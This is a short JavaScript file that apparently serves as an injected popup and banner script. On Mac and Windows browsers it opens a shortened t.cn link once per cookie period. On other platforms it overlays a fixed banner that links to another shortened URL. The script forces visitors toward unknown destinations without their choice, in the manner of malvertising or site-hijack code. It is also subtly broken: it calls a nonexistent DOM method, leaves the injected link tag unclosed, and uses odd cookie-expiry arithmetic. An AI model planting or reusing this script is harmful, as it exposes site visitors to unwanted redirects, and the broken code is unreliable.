if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
    if (!getCookie('cc_cookie')) {
        setCookie('cc_cookie','ok',1);
        window.open("http://t.cn/EGwSi9P");
    }
}else{
    var newNode = document.createElement("div");
  newNode.innerHTML = "<a href=\'http://t.cn/EGwS68r\'rel=\'noreferrer\'><img src=\'https://telecom2019.github.io/qpttw.gif\'class=\'pic66\'/><style>.pic66{position:fixed;bottom:0px;width:100%;height:10%}</style>";
document.getelementbytagname("body").appendChild(newNode);


   

}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return "";
}
function setCookie(key, val, time) {
    var date = new Date();
    var expiresHours = time;
    date.setTime(date.getTime() + expiresHours * 2000 * 1000);
    document.cookie = key + "=" + val + ";expires=" + date.toGMTString();
}
